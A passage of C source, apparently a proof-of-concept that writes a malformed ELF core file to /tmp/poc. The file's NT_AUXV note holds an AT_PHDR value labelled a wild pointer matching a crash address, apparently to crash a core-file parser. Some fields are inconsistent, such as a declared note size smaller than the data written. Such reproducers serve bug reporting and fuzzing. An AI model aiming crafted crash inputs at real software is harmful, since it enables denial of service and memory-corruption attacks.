    uint32_t p_type;
    uint32_t p_flags;
    uint64_t p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align;
} Elf64_Phdr;

typedef struct {
    uint32_t n_namesz, n_descsz, n_type;
} Elf64_Nhdr;

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    Elf64_Ehdr eh;
    memset(&eh, 0, sizeof(eh));
    memcpy(eh.e_ident, "\x7f""ELF\x02\x01\x01\x00", 8);
    eh.e_ident[7] = 0; /* EI_ABIVERSION */
    eh.e_type = 4;      /* ET_CORE */
    eh.e_machine = 62;  /* x86-64 */
    eh.e_version = 1;
    eh.e_phoff = 64;
    eh.e_ehsize = 64;
    eh.e_phentsize = 56;
    eh.e_phnum = 1;
    eh.e_shentsize = 64;
    eh.e_shnum = 0;

    /* Program header: PT_NOTE at offset 0x100, size 0x100 */
    Elf64_Phdr ph;
    memset(&ph, 0, sizeof(ph));
    ph.p_type = 4;      /* PT_NOTE */
    ph.p_offset = 0x100;
    ph.p_filesz = 0x100;
    ph.p_align = 8;

    /* Note: NT_AUXV (type 6) with CORE name, descsz = 16 (2 auxv entries) */
    Elf64_Nhdr nh;
    memset(&nh, 0, sizeof(nh));
    nh.n_namesz = 5;  /* "CORE\0" */
    nh.n_descsz = 16;
    nh.n_type = 6;    /* NT_AUXV */

    /* Auxv entries: AT_PHDR (3) with a wild pointer, AT_NULL (0) */
    uint64_t auxv[4];
    auxv[0] = 3;              /* AT_PHDR */
    auxv[1] = 0xe7c26fe0ULL;  /* wild pointer (matches crash addr) */
    auxv[2] = 0;              /* AT_NULL */
    auxv[3] = 0;

    fwrite(&eh, 1, sizeof(eh), f);
    fwrite(&ph, 1, sizeof(ph), f);
    /* pad to 0x100 */
    {
        uint8_t pad[0x100 - (64 + 56)];
        memset(pad, 0, sizeof(pad));
        fwrite(pad, 1, sizeof(pad), f);
    }
    /* name: "CORE\0" padded to 8 */
    fwrite("CORE\0\0\0\0", 1, 8, f);
    fwrite(&nh, 1, sizeof(nh), f);
    fwrite(auxv, 1, sizeof(auxv), f);

    fclose(f);
    return 0;
}

